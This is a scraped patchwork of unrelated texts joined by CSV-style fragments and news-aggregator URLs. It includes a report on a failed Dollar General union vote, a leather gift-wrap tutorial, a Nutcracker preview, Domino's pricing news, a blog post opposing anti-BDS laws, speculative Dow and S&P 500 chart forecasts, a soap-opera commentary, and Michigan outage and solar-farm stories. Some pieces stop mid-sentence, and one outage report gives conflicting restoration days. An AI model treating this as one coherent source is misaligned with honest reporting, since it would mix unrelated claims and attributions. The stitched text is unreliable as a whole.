The dismissal shook some of Serafini’s co-workers who were convinced that he was fired because he was pro-union or possibly because the Dollar General executives believed he had instigated the union drive. It incensed Parsons who felt responsible. Serafini had been filling in for her on the day he was fired.

At the union’s request Parsons did interviews with CNN HuffPost and the Hartford Courant. She recorded a video for More Perfect Union a labor advocacy group in which she talked about Serafini’s dismissal. “The only people that can save us is a union” she said on the video.

Six days before the vote Parsons believed that three out of six employees including Serafini who despite his dismissal was allowed to vote were pro-union. One was wavering a worker named Jen whose vote was crucial. The woman did not respond to requests for comment from The Washington Post for this story. Parsons said that a Dollar General executive had warned Jen about the closing of the Auxvasse store and suggested that the same thing could happen in Connecticut.

“I need you to call Jen and talk to her” Parsons texted the UFCW organizer Jessica Petronella. “They are getting to her. We have to act Very Quickly or we are going to lose her.”

Three days before the vote Parsons Jen and Petronella met in a supermarket parking lot a short drive down the highway from the Dollar General. It was a spot where they hoped that the company’s executives and consultants who now outnumbered the workers wouldn’t see them.

Petronella said she asked Jen to draft a statement describing what she considered to be the company’s threat to close the store along with an account of Serafini’s firing. Jen wrote that the executive told her to “look into the dollar general store that had been closed” and shared that Serafini’s firing may have been related to corporate’s belief that he had been the first to call the union.

Dollar General in response to questions from The Post said that no threats were made to close the Connecticut store and denied that Serafini was “treated unlawfully.”

Petronella intended to give Jen’s statement to the National Labor Relations Board which oversees union elections to ensure they are fair. She also saw the letter as a positive sign that Jen still supported the union.

On election day the NLRB set up a small white tent in the parking lot of the Dollar General. Parsons who agreed to serve as an observer for the union arrived at 8:30 a.m. and cast her ballot. A worker representing the company occupied a second table. For the next two hours Parsons sat watched and nervously waited as her co-workers cycled through.

Dollar General was challenging Serafini’s ballot but he was still allowed to vote. “It’s a great day for democracy” he told Parsons as he entered the tent.

“Absolutely!” Parsons replied.

A second co-worker who backed the union grinned at Parsons as he dropped his ballot in the cardboard box. A good sign. There were two workers both part-timers who hadn’t supported the union. Parsons assumed they both voted no.

She was most worried about Jen who stood over her ballot for several seconds shaking her head as if she was thinking Parsons said. Parsons tried to catch her eye but Jen hurried past her.

At 11:05 a.m. an NLRB representative counted the votes. To prevail Dollar General needed at least three of the six workers to vote against the union. The first two votes were both no. Then there was a yes followed by a brief pause as the NLRB representative unfolded the next ballot. Parsons breathed in through her light blue surgical mask.

“No” the NLRB official read.

At first Parsons didn’t believe it. She walked out of the tent and into the sunlight lit a cigarette and inhaled deeply. One of her co-workers called Serafini to let him know the outcome.

“I hate to be the one to tell you” he began.

“You’re kidding” Serafini replied. He had assumed that the union would win and that he would be back to work in a week or two. Now he felt alone.

Parsons and Petronella drove to a nearby McDonald’s to figure out what had happened and talk about their next steps. Tears streamed down Parsons’s face. She believed that the election hadn’t been fair that Dollar General had “polluted” her colleagues’ minds with falsehoods and fear.

“Obviously Jen voted no” Petronella said.

Over the course of her life Parsons had grown accustomed to feeling abandoned — by her parents the foster-care system the police and the courts. Now she wanted the union to stand with her appeal the vote to the NLRB and keep fighting.

“What do we do now?” she asked Petronella.

For Petronella and the union the answer was to move on to other battles. She could have sought an order that would have forced Dollar General to bargain with the union. “You have to hire lawyers and it ends up costing a lot” Petronella said. For a company like Dollar General the expense was nothing. But the union’s resources were limited.

Petronella decided that it would be faster and cheaper to wait 12 months and petition for another union vote if Parsons and her co-workers were still interested. Her last piece of unfinished business from the Dollar General organizing effort was Serafini who with the help of the union and a Labor Department lawyer was negotiating a wrongful-dismissal settlement with Dollar General.

Petronella wanted Dollar General to have to acknowledge publicly its agreement with Serafini just as it had done in Missouri.

Serafini’s immediate goal was to pay some bills and move on with his life perhaps becoming a social worker. His dismissal he said had revealed what Dollar General really thought of its workers. “You have people go above and beyond for a minimum-wage job and then get tossed because a union might mean it costs a little more to run the store. It’s all about greed” he said. “It just feels gross.”

For Parsons there was only one option after the union organizing effort failed: A few weeks after the election her alarm clock woke her at 5:15 a.m. giving her just enough time to stop by the methadone clinic for her daily dose before heading off to work.

The Dollar General executives had returned home and the store had settled back into its old rhythms. Parsons helped unload a “humongous truck” that arrived that morning and fell off a ladder while trying to retrieve a box of adult diapers from a storage shelf for an elderly customer. In the afternoon she headed off to a second job cleaning houses. She lugged bags of supplies and a scuffed yellow vacuum up the driveway of a small brick ranch house her back still throbbing from her fall. After only a few minutes of work her forehead glistened with sweat.

Parsons was more than $5000 behind on her electricity bill but was determined to use the money from her housekeeping jobs to pay the lawyer who was helping her fight for custody of her daughter. She saw Bella three times a week — visits that began with tense handoffs that Parsons knew took the heaviest toll on Bella.

After police charged Parsons’s ex with “threatening” behavior and “breach of peace” the courts granted Parsons a restraining order and mandated that she and her former partner exchange Bella in a well-lit public spot. For now it was the Big Y supermarket. Inside the store the two parents stood about 10 yards apart recording each other with their phones as their 8-year-old daughter ran with her head down from her father to her mother.

“Today Mommy doesn’t have too much money” Parsons said as she hurriedly outlined some options for their three-hour visit. Bella chose a $5.75 matinee of the new Marvel movie and Parsons began firing questions at her.

“Have you taken a shower lately?”

“What’s Daddy feeding you?”

“You’re still coughing baby. Are you taking your medicine?”

Three-quarters of the way through the movie Bella started to worry that they were going to be late for the court-mandated 8 p.m. drop-off with her dad. So they left early giving Parsons just enough time for a quick cigarette break before they sped through the Wendy’s drive-through. Her feet were sore. Her back still ached. Her gas gauge hovered just above empty. Parsons lit a cigarette in the parking lot. A few kernels of movie theater popcorn tossed by a giggling Bella struck her on the cheek.

Back at the Big Y they repeated the recorded drop-off in reverse. This was the worst part of Parsons’s day the time she felt most alone. “I fight addiction. I fight for my job. I fight for my kid. I fight for my survival” she said. “Every single way I turn I have to fight.”

One thing she could no longer afford to fight was Dollar General and so these days she was focused relentlessly on the company’s positives. Dollar General had dismissed the district manager who accused her boss of stealing — falsely employees said — and replaced him with a new person who seemed fair. The new district manager had recently promised to start reimbursing store employees for their mileage when they had to drive to the bank to drop off the day’s deposits. It wasn’t yet clear whether they would be reimbursed thousands of dollars for earlier unpaid trips.

“After the election I started to find out the truth about Dollar General” Parsons said. “It is not what we thought. If they knew what was going on they would have fixed it earlier. Really it was just a couple of bad people. Everyone has their flaws but Dollar General is great people.”

Parsons didn’t regret calling the union. Without the organizing effort she believed the problems at her store would never have been addressed. “It helped 100 percent” she said. But she also wasn’t upset that the unionizing push had failed. “If we won honestly I don’t know anymore” she continued. “I don’t know if it’d be different. Everything is just confusing.”

Two weeks before Thanksgiving Parsons received another bit of good news: Someone had posted on Parsons’s employee group text chat that the store would be closed on the holiday a change from previous years when it had been open for extended hours. “The union isn’t involved and they are still doing it” she said.

But it turned out that the company wasn’t actually doing it. The store was open from 7 a.m. to 10 p.m. on Thanksgiving Day just as it had been the previous year and Parsons was scheduled to work.

She didn’t let it bother her. She needed the money. She worked an 11-hour shift and then rushed to the Big Y where Bella was waiting.

First off let me say that I do not think this is normal. And normal people do not wrap their presents like this. Nor should they. It's absurd. Just so you're all aware that I am aware that this is nuts.

I know. You were probably expecting more. Nothing this subtle. You were thinking I'd do something more along the lines of building box sized replicas of my chicken coop that gifts can be placed inside weren't you? Well I wasn't going to do that because I only just thought of it. It randomly popped into my brain which is exactly where I'm tucking that idea away until next year.

So. What we have this year is a very simple plaid paper which I miraculously found at my local dollar store in amongst the wrapping papers featuring Bart Simpson The Little Mermaid and other current animated characters from the 1990's.

It all started out quite simply. Wrap a present in the plaid paper.

Done.

This is where things get weird. Although I didn't think they were weird while I was doing the wrapping. I really did not think this year's Christmas wrapping was over the top in any way.

That is until I started to edit the photos below and got to the one where I'm heating up a branding iron. Yeah. A branding iron. There's rubber cement and leather working tools too.

Who's with me?!

Here we go ...

MATERIALS

long leather scraps* (enough to make belts to fit around a standard box)

rotary cutter and mat

hole punch

rivet setter

straight edge

rivets

branding iron

tiny buckles

rubber cement

Listen - you know when your wrapping requires rubber cement things are getting f*cking serious.

I have swaths of leather that I got from a reader who was moving out of the country. But prior to acquiring this stash and teaching myself a bit of leather working with it I used to go to thrift stores and buy old ugly leather jackets for cheap and cut them up for leather projects.

INSTRUCTIONS

Cut tag shapes out of leather. I made a little pattern to use.









That super-cool archaic looking tool up there is a combo hole punch/ rivet setter. I just bought it and I love it.

Punch hole in top of tag

Insert grommet













Clamp grommet with super-cool tool

Now you have a finished looking product. You are ALL pro now with that grommeted tag.

Time to heat up your branding iron because you are in fact made up of 10% regular human stuff and 90% lunacy.







Brand that leather with that Christmas tree branding iron. (I got it on Etsy you can get one here)

The hotter the branding iron is the more black the brand will be. So if you use the same branding iron for 3 pieces of leather the brand will get progressively lighter.

I'm telling you this for your interest not because I believe anyone is going to make custom leather tags for their gifts that they will brand themselves.

Will they? Will you? If so then you're more squirrelly than I thought and that of course pleases me.

Grab your tool stamping set and whack the first initial of the gift recipient in the spot where the tree's star would go.







""M"" is for mom. Or maniac. Or 'member when water beds were the pinnacle of fancy?

Alright your tag is done. Now we move onto the body of the work. The belt.

Cut a long thin strip of leather about 4"" longer than the circumference of the box.

Attach the buckle to one end by punching a hole near the end of the leather and inserting the buckle prong thing through the hole.









Apply a bit of rubber cement then clamp the leather together to attach the buckle. (you can also use a rivet but I ran out of rivets about 2 belts into the project so I switched to glueing)

After the cement has dried remove the clamp and wrap the belt around the present.









Make a little tab to wrap around the belt to hold the strap in place.

Hang the tag.

And you thought this was going to be complicated.

It couldn't be simpler.

For reasons of a poodle nature I couldn't pile the presents on the floor this year.

So I decided to use them like a centrepiece on my hall table. That's fresh garland. It'll be crispy and awful in 3 days so don't be envious of how nice it looks. It'll be replaced with fake garland for the rest of the season (blogger secrets.)

What I'm really looking forward to is using this idea on other presents. Those belts with smaller tags on plain white paper for instance? Beautifullll.





I really like the wrapping this year. Plus the little leather belt and tags can be used afterwards by the recipients as well. I'd probably wrap the belt around a plain white cookie jar or straight sided ceramic vase. And the tag can be used as an identification tag for luggage. Or a keychain.

As it turns out I really like the presents stacked on the table.",https://news.google.com/articles/CBMigAFodHRwczovL3d3dy5yZXB1YmxpY2FuaGVyYWxkLmNvbS9uZXdzL3BvdHRzdmlsbGUtbWFuLWZhaWxzLXRvLXJlcG9ydC10by1wcmlzb24vYXJ0aWNsZV8xNjQzNGUzNC02YmEyLTU3NDctOTlmYS02ZmEzZGU0NjY4OTkuaHRtbNIBAA?hl=en-US&gl=US&ceid=US%3Aen,Pottsville man fails to report to prison | News | republicanherald.com,"State Alabama Alaska Arizona Arkansas California Colorado Connecticut Delaware Florida Georgia Hawaii Idaho Illinois Indiana Iowa Kansas Kentucky Louisiana Maine Maryland Massachusetts Michigan Minnesota Mississippi Missouri Montana Nebraska Nevada New Hampshire New Jersey New Mexico New York North Carolina North Dakota Ohio Oklahoma Oregon Pennsylvania Rhode Island South Carolina South Dakota Tennessee Texas Utah Vermont Virginia Washington Washington D.C.

“Tickets are flying off the shelves showing how much this community values this production” said Stoner Winslett the ballet’s artistic director. Winslett said tickets almost sold out before the ballet even started advertising for this year’s production.

Due to high demand two performances have been added to the initial 10-performance run with best availability being Tuesday Dec. 21 at 7 p.m. and Wednesday Dec. 22 at 2 p.m.

This year is the last time viewers can catch the production with its current sets and costumes lauded by The New York Times as “one of the country’s most perfect [Nutcracker productions].”

New sets are currently being built in New York for next year’s production. Richmond Ballet has been using the same sets since 2003.

“It’s not because we don’t love these but they wear out over time” Winslett said.

The “dazzling” new sets will go with the costume designs that Richmond Ballet currently uses and has been updating over the years. There won’t be any choreography changes.

“Every year I try to make little changes to make it better and better” Winslett said. “I think we’re at a pretty good version now.”

This year one big change is that there will be fewer children under 12 appearing. In 2019 127 children under 12 were cast in the production. This year only 18 children under 12 were cast because at the time of casting vaccines weren’t yet available to children under 12.

“There’s no way to put on this show safely without a vaccinated cast” Winslett said. The ballet reduced the number of lambs and mice to three sections of six children under 12 who will be dancing masked.

But the ballet was able to increase roles for children between 12 and 18 to 75 roles. All students who auditioned over the age of 12 were cast.

“We’re so pleased to be able to find a part for all of these kids who love ballet and have been studying on a screen during the pandemic. It’s such a pleasure to give them a chance to perform again” Winslett said.

Also new this year all audience members ages 12 and above will be required to show proof of full vaccination against COVID-19 or a negative COVID-19 test taken within 72 hours of the performance. All patrons ages 2 and above are required to wear a mask at all times except when eating and drinking. These COVID precautions are similar to most performing arts venues in Richmond.

“The Nutcracker” will be performed at the Dominion Energy Center 600 E. Grace St. through Dec. 23; times vary. Tickets run $25 to $125 and can be purchased at etix.com or (800) 514-3849.

While they recognize Anwer’s ethic people in the comment section said he shouldn’t work so hard if he’s not getting paid well.

“If he is not benefiting from his accomplishment then he needs to learn the concept of ‘act your wage’” a commenter said.

“Domino’s doesn’t pay you enough for your hard work bro” another wrote.

“And he [only made] $12 that hour while making dominos $100’s” a person wrote.

On the other side were people who said Anwer’s effort will eventually pay off.

“That’s how you get the raise. Have to show your worth just like anything else. He will outgrow that job fast” a commenter said.

Photo / Supplied

Fast-food chain Domino's Pizza says it is increasing the prices on some of its value-range pizzas for the first time in a decade from today.

Domino's New Zealand general manager Cameron Toomey cited the growing cost of labour groceries and ingredients for the price increase.

But in a statement he also said it was reducing prices on some of the chain's ""extra value traditional and gourmet pizzas"".

Toomey said more than 10 years ago Domino's redefined value for their customers with the introduction of their $5 value range.

But a decade later with the growing cost of labour groceries and ingredients it was going to pass on the extra cost to the consumers.

""Our range has grown and evolved to include more pizzas made with higher quality ingredients. And the world has changed too. The cost of labour groceries and ingredients has increased every year"" Toomey said.

""We have had to slightly increase the price of some of the pizzas in our value range such veg trio which will now be available for $6' he said.

But most pricing for most of its products would remain the same.

Despite the increasing prices there would also be a price decrease for some of its pizzas and new product launch.

""We'll be reducing the price of many of our extra value traditional and gourmet pizzas such as mega pepperoni vegorama mr wedge godfather apricot chicken and BBQ chicken and rasher bacon.

""We'll also be launching a new and improved recipe for our iconic Hawaiian pizza (which will move into our extra value range) and will be keeping our most popular value-range pizzas like pepperoni and simply cheese available from $5"" he said.

Toomey said in the past 12 months the chain has also started various environmental initiatives such as better chicken commitment committed to using only green electricity by 2030 to become a carbon-neutral company.",,,

Dow | The Blogs,"I’m a proud Zionist. I’ve been teaching about modern Israel for the past 20 years. I’ve lead countless trips to the country lived there a short time and have a brother close friends & family that still do. I love the place — a passion that is obvious to my students. However even though kids will say they appreciate when teachers genuinely care about their subject when it comes to one like Israel strong feelings have to be carefully managed in a classroom. The reason of course is because in an academic environment students should be encouraged to question be critical thinkers and form their own opinions — even if the subject is Israel in a Jewish school.

This approach is not only the best practice in terms of an intellectual principle it’s also smart strategically — because if graduates later realize or even just perceive that they weren’t taught in an academically honest way they’re likely to resent it and respond accordingly. In fact we know from recent studies that’s exactly what has occurred with some Israel education. So at the outset of the modern Israel course I teach to high school seniors I share my “bias” — that I am a Zionist — and I assure them that they will not be graded according to what they believe. They must however make well-founded & well-reasoned arguments.

In terms of curriculum this approach requires that we acknowledge and discuss Israel’s historical shortcomings and current imperfections — whether it’s all the causes of Palestinian refugees or all the implications of settlement expansion in the West Bank. But this is no different than how we’d expect a United States history class to be taught today — by including things such as treatment of Native Americans slavery of African Americans Jim Crow and the Civil Rights movement.

Admittedly a large part of the course is designed to prepare students for the virulent often one-sided frequently anti-semitic treatment that Israel receives on college campuses across the United States today. As such the Boycott Divest & Sanction (BDS) movement is a necessary part of this conversation — a movement I oppose despite my ongoing longing for a two-state solution and peaceful co-existence. There are many reasons why I oppose BDS including:

The movement’s refusal to acknowledge Israel’s right to exist; the movement’s refusal to acknowledge indigenous Jewish roots in the land; the movement’s refusal to acknowledge Jewish refugees forced from Arab lands; the movement’s refusal to acknowledge the number of times Palestinians have been offered a state; the movement’s gross mischaracterization of Israeli democracy for Arab citizens; the movement’s negative impact on fostering genuine dialogue between those committed to understanding the other side’s narrative (such as artists & academics); and the movement’s negative economic impact on actual Palestinian lives.

And yet all of that said & my personal feeling aside in a marketplace of competing ideas — such as an academic environment or a free society — the right to argue disagree and dissent are paramount. Which is why I also oppose American laws designed to penalize US companies for not opposing BDS.

In recent years over 30 states have enacted various forms of legislation that require businesses to pledge that they will not boycott Israel in order to qualify for various things such as government contracts. Technically speaking some of these laws may pass Constitutional muster — they’re still being litigated so the proverbial jury’s still out — but that misses a larger point. Regardless of their legality I worry that these laws are actually bad for Israel. Here’s why.

In a recent op-ed in the New York Times the editor of a small town Arkansas newspaper lamented why he & his company had to sign an anti-BDS pledge. For a moment leave aside the complicated legal arguments at play here; instead consider the understandable perception of this otherwise disinterested businessman: that he’s being strong-armed. And regardless of the possible correctness of the law’s well-intentioned goal — that BDS is biased intentionally deceitful and actually counter-productive — the method employed here upsets folks because it aims to stifle political expression a right considered sacrosanct in America.

Proponents of these laws argue that curbing commerce in light of national foreign policy goals is permitted & that individuals’ First Amendment Rights have not been compromised by the legislation. Theoretically that may be true — but practically it’s far less clear. I urge you to read the op-ed referenced above and look up the numerous lawsuits filed by individuals who have been impacted by these rules. Optics matter and these optics aren’t good.

This isn’t a firm doing business with a terrorist state. This isn’t a company propagating domestic insurrection. This isn’t a store refusing to serve a protected class. These are Americans who may want to “protest” by not buying from another country.

Worse yet this tactic isn’t strategic. How does Israel actually benefit from this especially in the long run? In fact the heavy-handed approach may re-enforce a sense that Israel (and Zionists and Jews) are disproportionately empowered — manipulating levers of influence in crafty undemocratic ways. (Ideally the ACLU lawyers opposing these laws will have Jewish-sounding last names!)

In the end the battle for public opinion feels perpetually uphill for those of us who support Israel. The astonishing ignorance of history the baseless intersectionality on unrelated social issues and the subtle but pernicious double-standards imposed on the world’s only Jewish State all conspire to make our work Sisyphean. There will always be detractors. And yet for the fair-minded middle — whether those are students in a classroom or citizens in our communities — my preference is to win on the merits and rely on moral right not political might.",https://news.google.com/articles/CBMijAFodHRwczovL3d3dy5jbWNtYXJrZXRzLmNvbS9lbi9uZXdzLWFuZC1hbmFseXNpcy9jaGFydC1vZi10aGUtd2Vla2Rvdy1qb25lcy1pbmR1c3RyaWFsLWF2ZXJhZ2UtdXMtMzAtcG90ZW50aWFsLWVucm91dGUtdG8tZnJlc2gtYWxsLXRpbWUtaGlnaNIBkAFodHRwczovL3d3dy5jbWNtYXJrZXRzLmNvbS9lbi9uZXdzLWFuZC1hbmFseXNpcy9jaGFydC1vZi10aGUtd2Vla2Rvdy1qb25lcy1pbmR1c3RyaWFsLWF2ZXJhZ2UtdXMtMzAtcG90ZW50aWFsLWVucm91dGUtdG8tZnJlc2gtYWxsLXRpbWUtaGlnaF9hbXA?hl=en-US&gl=US&ceid=US%3Aen,Chart of the week – Dow Jones Industrial Average (US 30) potential enroute to fresh all-time high,"Chart of the week – Dow Jones Industrial Average (US 30)

Dow Jones Industrial Average (US 30) potential enroute to fresh all-time high

Short-term technical analysis

Time stamped: 12 Dec 2021 at 12:00pm SGT ( click to enlarge chart)

Source: CMC Markets

In our previous “Chart of the week” feature for the “Week Ahead Newsletter 29 November to 3 December 2021” the Dow Jones Industrial Average (US 30) has tested the predefined 34110 short-term pivotal support (without a 4-hour close below it) and staged the expected rally to hit the 35900 resistance/target (printed a high of 35982 on 10 December). Where do we go from here?

During the prior pivotal week in terms of news flow & economic data release (official default labelling on indebted Chinese developer Evergrande’s offshore bonds & the red-hot US CPI print for November) the price actions of Dow Jones Industrial Average (US 30) has managed to maintain its upside momentum and ended with a weekly “Bullish Marubozu” candlestick after a retest close to its 50-week moving average in the week of 29 November.

Hence the latest set of price actions seen on the weekly chart of US 30 suggests that it may continue its major impulsive up move sequence (multi-month) towards the potential 38450/40000 risk level (the potential terminal zone of the long-term secular uptrend phase in place since Mar 2009 low).

In the short to medium-term as depicted on the 4-hour chart key technical elements are still supportive to advocate for a further potential push up in price actions. Firstly Elliot Wave/fractal analysis suggests that price actions continue to evolve within a potential minor impulsive up move sequence since 2 December 2021 low of 33951 and last Friday 10 December bullish breakout above the prior resistance of 35920 (that led to previous drop of -5%) has indicated that the latest rally may be the minor wave v up move to complete the entire 5-waves minor bullish impulsive up move sequence of 1/ before the risk of a minor pull-back/consolidation sets in.

The 4-hour RSI oscillator remains in a bullish configuration above a key corresponding support at the 56% level and has not hit its extreme overbought level. These observations suggest that short to medium-term upside momentum remains intact.

If the 35500 key short-term pivotal support holds the Dow Jones Industrial Average (US 30) may continue its ascend to retest the current all-time high level of 36564 before another potential rally towards the 36800/875 resistance zone (upper boundary of the ascending channel from 2 December 2021 low & Fibonacci expansion level).

(upper boundary of the ascending channel from 2 December 2021 low & Fibonacci expansion level). On the flipside a 4-hour close below 35500 negates the bullish tone for a minor corrective pull-back towards the 34900 key medium-term pivotal support.

Based on the comparison between the Percentage of stocks above 200-Day average and the SPX for the past 10 years the divergence happened since Feb 2021 as the SPX continue to trend higher the number of stocks participated in the uptrend is getting lesser deteriorated from 90% to 42% as of last Friday since Feb 2021.

In fact many growth stocks such as Affirm Holdings (AFRM) CrowdStrike Holdings (CRWD) Fiverr International (FVRR) MercadoLibre (MELI) Sea (SE) Twilio (TWLO) DocuSign (DOCU) Roku (ROKU) PayPal Holdings (PYPL) etc…experienced big drawdowns range from 32%-65% from their all time high.

There are only a handful of outperforming stocks like Apple (AAPL) Microsoft (MSFT) Lam Research (LRCX) Broadcom (AVGO) Qualcomm (QCOM) etc… supporting the S&P 500 index.

The divergence between the SPX and the stock market breadth are certainly not a healthy sign for the bull market especially it has been persisting for nearly 10 months. It might only take a few early capitulations from the funds to trigger a broad market sell-off when the market is at the vulnerable point.

It can be noticed from the chart that 50% level is a support. When the percentage of stocks above 200-Day average dropped below 50% there was a relatively sharp sell-off in SPX as highlighted in orange color in 2011 2014 2015 and 2018. The market breadth is often acted as a leading indicator before the damage hits the SPX.

Current Market Outlook on S&P 500

S&P 500 did have a rally after an oversold condition at the support area while there was presence of demand as pointed in last week’s article. Detailed analysis can be found by watching the price volume analysis for the market outlook on YouTube.

As shown in the screenshot on 8 Dec from my private Telegram Group for Mastering Price Action Trading course above the four US major indices – S&P 500 (SPX) Dow Jones (DJI) Nasdaq (IXIC) and Russell 2000 (RUT) are likely in a consolidation with high volatility to both sides.

It is obvious that there was an increase of supply on the down wave since Black Friday selloff which is yet to be tested. As S&P 500 approaches the resistance zone at 4700 it could be vulnerable for a correction when the sellers step in to lock in profit or initiate short positions. Should a correction happen the previous swing low near 4500 is a natural area for buyers to step in for bargain hunting.

It is critical to judge the supply level together with the characteristics of the price action (spread and velocity) to anticipate next move. For a bearish scenario watch out for a Wyckoff up thrust (false breakout) with increasing supply followed by a break below 4650. For bullish case S&P 500 needs to commit above the resistance level at 4720.

Story continues

Based on the market breadth and the Wyckoff phase analysis on SPX a trading range between 4500-4700 is expected. There could be other headwind ahead such as Fed’s tapering of the bond-buying program and an urgency for interest rate hike which I will be discussing in my weekly live session on Sunday.

Sarah Horton had her life stolen from her by whack job Kristen DiMera all because Sarah realized she was back in town and on the loose. Sure being too smart for her own good can sometimes be a problem on soaps but hasn’t Sarah — as well as Xander Cook and Days of our Lives viewers — suffered enough?

Bring Sarah Back on Days of our Lives

The sad part is no one had really noticed she’s missing. Sure Kristen (Stacy Haiduk) is top-notch at snatching phones and texting loved ones of people she’s either impersonated or imprisoned (often both) but surely Maggie Horton Kiriakis (Suzanne Rogers) has wondered why Sarah wouldn’t return to town after her sister Summer (Marie Wilson) passed away! Sarah’s not a deadbeat daughter!

What about her job working alongside Dr. Kayla Brady Johnson (Mary Beth Evans)? Did a disguised Kristen bother to take the time to write up a proper resignation letter that didn’t set off any alarm bells? Really? While we’re grateful Rex Brady (Kyle Lowder) has returned and will inevitably spill the beans that he hasn’t been with Sarah all this time will it really cause anyone to worry?

The way this Days of our Lives crowd is it’s a wonder Sami Brady DiMera (Alison Sweeney) was ever rescued. No one worried about her either when she went missing. Doesn’t anyone care about their loved ones enough to try calling? Alas another casualty of a text-only society we suppose. That’s good for Kristen bad for poor Sarah.

She had a very full life when she was in Salem — a mother who loved her friends who care about her and Xander (Paul Telfer) who loved her with all his heart. We know Kristen is a DiMera and therefore she has to be good at being bad but isn’t it time that someone as resourceful as Sarah finds a way to escape and return home? Salem needs her. Xander needs her. Maggie needs her. OK we the viewers need her too. Could she be our Christmas miracle this year?

DTE Energy reports 23417 customers are still without power as of 11:30 a.m. Monday with nearly 2300 crews working to restore electricity. By 3 p.m. the number was down to 17258.

Consumers Energy reports 10925 customers without power and a total of 774 outages in its coverage area. By 3 p.m. it was down to less than 8000 homes and businesses.

“All hands on deck as crews continue to make great progress restoring power to our customers” Consumers Energy wrote. “If you receive a message that your power has been restored and it has not please respond to our text or call us back to let us know. We’re very thankful for your patience as we work as quickly and safely as possible to get everyone restored.”

Consumers Energy sent out a statement saying the company expected the majority of its customers to have power restored by midday Monday Dec. 13.

DTE wrote “More than 1500 team members are working in the field today to restore your service and we’re on track to restore power to 80% to 90% of impacted customers by end of day Sunday.”

DTE asks that anyone stay at least 20 feet from a downed power line and to always assume power lines are live and dangerous.

Ned Birkey an MSU Extension Educator emeritus and agricultural consultant told the county board Tuesday night that the county has scores of transmission lines that make the region attractive to DTE Consumers and other energy firms. Birkey said during his annual report on agriculture that he has visited more than a half-dozen townships to consider incorporating helpful guidelines from the state in their ordinances to control development of solar and wind energy projects.

“Every township is different in where they are at in writing” an ordinance Birkey told the nine-member board. “Many have not finished their ordinances yet and some are farther along. Michigan has a new model ordinance. I’ve offered them copies of the ordinance that was drafted by both the University of Michigan and Michigan State University together. There are a lot of side issues like health and safety to consider when it comes to solar.”

The first solar farm – Temperance Solar -- was built in 2020 on 150 acres making up the former site of the B.L. Cousino Inc. hay and straw mill in Erie Township that had existed since the mid-1930s. A 20-megawatt energy project is already operating on the parcel located at S. Dixie Hwy. (M-125) and Sterns Rd. and was constructed by Geronimo Energy.

A Virginia firm has plans to develop the second solar-powered energy farm in the county called Azalia Solar along US-23 in a rural portion of Milan Township. Apex Clean Energy of Charlottesville Va. is planning to build a 150-megawatt facility that is expected to generate enough homegrown Michigan energy to power up to 26400 homes per year the firm said. The targeted site is farmland located between the Village of Dundee and the City of Milan. The project is named after the former village at Ostrander and Dundee-Azalia Rds. in the southeast corner of Milan Township.

Birkey said in September Bedford Township wisely turned down a proposal from a private developer to build a solar farm on 800 acres. He said the state model ordinance recommends that solar farms be developed on industrial land not agricultural land. The Bedford project was proposed on farmland not an industrial site.

“To their credit Bedford denied the request” he said.

He said Frenchtown Township has many sites suitable for a solar project that don’t involve prime agricultural land. These include DTE transmission lines along I-75 the Mall of Monroe and Sterling State Park.

“There’s a lot of acreage at Sterling and the mall that is not being used currently” he said. “Instead of looking to place these projects on agricultural land they should look at other land.”

He said Frenchtown has asked him to come back to provide additional information about zoning for solar projects. He said farmland has eight different categories or classifications that can be used to plan development. He said some projects like a solar farm might require extra approvals before the project can start.

He said a representative from Ash Township told him the township is so close to Detroit Metropolitan Airport any proposal to build a solar farm in the township could be vetoed by the airport authority.

Since mid-October he also has met with officials from Exeter Ida LaSalle and London townships about their ordinances.

He plans to visit other townships in 2022.

“My only goal is to educate and present information they might want to consider for their ordinance” he stressed. “I’m not in favor of or against solar. That’s not my role. My job is to be neutral and give information.”

Commissioner Dawn Asper from Carleton said she was opposed to solar farms gobbling up good farmland in the county.

“You can’t produce that much energy just for solar” Asper said. “France is supposedly so advanced with solar but they only produce 5 percent of their energy. Solar fields are a waste and can’t be recycled.”

Commissioner David Hoffman from Dundee said a growing number of farmers around the state are selling their farmland to solar projects because of lucrative prices being paid for their property.

“Some are getting $7000 to $8000 an acre” Hoffman said. “One farmer said `that’s my retirement’.”

Another commissioner said nuclear energy is still “very efficient",https://news.google.com/articles/CBMieGh0dHBzOi8vd3d3LmNsaWNrb25kZXRyb2l0LmNvbS9uZXdzL21pY2hpZ2FuLzIwMjEvMTIvMTIvY29uc3VtZXJzLWVuZXJneS1wb3dlci10by1iZS1yZXN0b3JlZC1mb3ItbW9zdC1ieS1lbmQtb2YtbW9uZGF5L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Consumers Energy: Power to be restored for most by end of Monday,"A PPL lineman works on power lines on High and Arch Streets after strong winds moved through the area in the morning on Monday April 13 2020 in Wilkes-Barre Pa.

Following severe winds that caused tens of thousands of power outages across Michigan Saturday utility company Consumers Energy says power should be restored to most of its customers by the end of Monday.

Strong winds blew through Michigan’s Lower Peninsula Saturday afternoon causing damage throughout much of the southern half of the state. According to Consumers Energy more than 150000 customers lost power amid the severe weather.

The company said early Sunday morning that power was restored to about 84000 customers overnight Saturday. Power is expected to be restored to most affected Consumers Energy customers by the end of Monday.

“Our crews ... completed great work through the night and we are looking forward to favorable weather today to continue to restore power for residents and businesses” Melissa Gleespen one of Consumers Energy’s Officers in Charge said Sunday morning. “We have also added crews to our system from Mutual Assistance that will enable us to have a successful day of restoration.”

As of 9:40 a.m. Sunday about 59900 Consumers customers were still affected by power outages. We’re tracking Sunday power outages right here.

Power is expected to be restored to most affected DTE Energy customers by the end of the day Sunday.

If you come across downed power lines do not touch them or go anywhere near them. Report the downed lines to authorities or your utility company and be sure to stay at least 25 feet away. Yellow caution tape indicates that there is a downed power line in the area -- for your own safety officials say you should not cross the caution tape.

“We are mobilizing crews and stationing them in our hardest hit areas to begin damage assessment and restoration work once the winds die down” said Guy Packard Consumers Energy’s vice president for electric operations in a written statement.

Consumers Energy officials said they expect a majority of customers to have electricity restored by day’s end on Sunday.

According to the National Weather Service a high wind warning remains in effect until noon Saturday for parts of the eastern Lower Peninsula. The warning has expired in West Michigan which remains under a wind advisory until 7 p.m.

As a reminder authorities advise to stay at least 25 feet away from downed power lines keep children or pets away from them and report downed power lines by calling 911 and Consumers Energy at 800-477-5050.

Consumers Energy also asks the public to keep a safe distance from crews because of both health precautions and for them to work effectively.

High winds in the Northeast

On Saturday the same storm that spawned a number of tornadoes across the mid-South also created high winds that knocked out power for many communities in the Midwest and Northeast.

In Michigan wind speeds of up to 63 mph were reported in the city of Frankfort.

